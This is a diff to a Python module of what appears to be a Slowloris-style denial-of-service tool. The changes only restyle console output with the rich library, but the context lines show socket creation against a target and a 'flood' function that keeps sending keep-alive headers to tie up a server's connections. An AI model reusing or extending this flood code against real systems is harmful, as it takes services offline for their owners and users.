@@ -1,14 +1,15 @@
 # Import modules
 import random
 import socket
+from rich.console import Console
 from bin.addons.utils import random_useragent
-from colorama import Fore
-from stringcolor import *
 
-red = "#ff0033"
-green = "#02f93c"
-yellow = "#eefc32"
-blue = "\033[38;5;51m"
+# Define styled print
+print = Console().print
+red = "red3"
+green = "green1"
+yellow = "yellow1"
+blue = "dark_slate_gray2"
 
 # Init socket
 
@@ -26,13 +27,11 @@ def create_socket(target):
         sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 
     except socket.timeout:
-        print(f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('Timed out', yellow)}")
+        print(f"[{red}][✘] ERROR[/{red}] [{yellow}]Timed out[/{yellow}]")
     except socket.error:
-        print(
-            f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('Failed create socket', yellow)}"
-        )
+        print(f"[{red}][✘] ERROR[/{red}] [{yellow}]Failed create socket[/{yellow}]")
     else:
-        print(f"{cs(f'[✔]', green)} {cs('Socket created...', yellow)}")
+        print(f"[{green}][✔][/{green}] [{yellow}]Socket created...[/{yellow}]")
         return sock
 
 
@@ -51,11 +50,13 @@ def flood(target):
                 sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
             except socket.error:
                 print(
-                    f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('Failed to send keep-alive headers', yellow)}"
+                    f"[{red}][✘] ERROR[/{red}] [{yellow}]Failed to send keep-alive headers[/{yellow}]"
                 )
                 sockets.remove(sock)
             else:
                 header = "{}:{}".format(*target)
                 print(
-                    f"\033[1m{cs('[✔] SUCCESS', green)}\033[0m {cs(f'Sending keep-alive headers to', yellow)} {blue}{header}\033[0m {cs(f'from socket {index + 1}.', yellow)}"
+                    f"[{green} bold][✔] SUCCESS[/{green} bold] "
+                    + f"[{yellow}]Sending keep-alive headers to[/{yellow}] "
+                    + f"[{blue}]{header} [{yellow}]from socket {index + 1}.[/{yellow}]"
                 )
